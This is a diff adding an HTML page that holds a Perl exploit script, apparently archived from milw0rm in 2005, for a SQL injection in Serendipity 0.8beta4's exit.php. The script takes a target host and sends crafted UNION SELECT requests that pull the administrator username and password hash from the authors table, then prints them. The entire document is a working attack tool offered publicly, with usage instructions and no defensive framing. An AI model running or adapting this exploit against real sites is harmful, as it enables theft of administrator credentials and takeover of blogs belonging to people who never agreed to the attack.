@@ -1,0 +1,69 @@
+<html>
+<head>
+<title>Serendipity 0.8beta4 exit.php SQL Injection Exploit</title>
+<pre>
+#!/usr/bin/perl
+# Serendipity 0.8beta4 exit.php SQL Injection exploit
+# (c) ADZ Security Team 2004-2005
+# (c) kreon 2005
+# http://adz.void.ru/
+# kre0n@mail.ru
+# Public :)
+
+print &quot;\n\n&quot;;
+print &quot;# Serendipity 0.8beta4 exit.php SQL Injection exploit\n&quot;;
+print &quot;# (C) ADZ Security Team 2004-2005\n&quot;;
+print &quot;# (C) kreon 2005\n&quot;;
+
+use IO::Socket;
+use Getopt::Std;
+
+getopt(&quot;h:d:p:t:&quot;);
+
+$opt_p ||= 80;
+$opt_d ||= &quot;/&quot;;
+$opt_t ||= &quot;serendipity_&quot;;
+
+if(!$opt_h) {
+    die(&quot;# Usage: $0 -h &lt;host&gt; [-d &lt;dir&gt;] [-p &lt;port&gt;] [-t table_prefix]\n&quot;);
+}
+
+$sqlpass = &quot;?entry_id=1&amp;url_id=1%20UNION%20SELECT%20password%20FROM%20&quot;.$opt_t.&quot;authors%20WHERE%20userlevel=255/*&quot;;
+$sqllogin = &quot;?entry_id=1&amp;url_id=1%20UNION%20SELECT%20username%20FROM%20&quot;.$opt_t.&quot;authors%20WHERE%20userlevel=255/*&quot;;
+
+print &quot;# Host: $opt_h\n&quot;;
+print &quot;# Dir: $opt_d\n&quot;;
+print &quot;# Port: $opt_p\n&quot;;
+print &quot;# Prefix: $opt_t\n&quot;;
+
+$Q1 = &quot;GET &quot;.$opt_d.&quot;/exit.php&quot;.$sqllogin.&quot; HTTP/1.0\n&quot;;
+$Q1 .= &quot;Host: &quot;.$opt_h.&quot;\n\n&quot;;
+
+$Q2 = &quot;GET &quot;.$opt_d.&quot;/exit.php&quot;.$sqlpass.&quot; HTTP/1.0\n&quot;;
+$Q2 .= &quot;Host: &quot;.$opt_h.&quot;\n\n&quot;;
+
+$s = IO::Socket::INET-&gt;new(Proto =&gt; 'tcp', PeerAddr =&gt; $opt_h, PeerPort =&gt; $opt_p) or die(&quot;Can't connect!&quot;);
+$s-&gt;send($Q1);
+$s-&gt;recv($txt, 1024);
+if($txt =~ m/location: (\S+)/i) {
+    $login =  $1;
+}
+
+$s = IO::Socket::INET-&gt;new(Proto=&gt;'tcp', PeerAddr =&gt; $opt_h, PeerPort =&gt; $opt_p) or die(&quot;Can't connect!&quot;);
+$s-&gt;send($Q2);
+$s-&gt;recv($txt, 1024);
+if($txt =~ m/location: (\S+)/i) {
+    $pass = $1;
+}
+if(!$login || !$pass || $login =~ m/http:\/\//i || $pass =~ m/http:\/\//i) {
+    print &quot;# Failed :(\n&quot;;
+    exit;
+}
+
+print &quot;# Succeed :)\n&quot;;
+print &quot;# Login: $login\n&quot;;
+print &quot;# Pass Hash: $pass\n&quot;;
+print &quot;\n&quot;;</pre>
+# milw0rm.com [2005-04-13]
+</html>
+
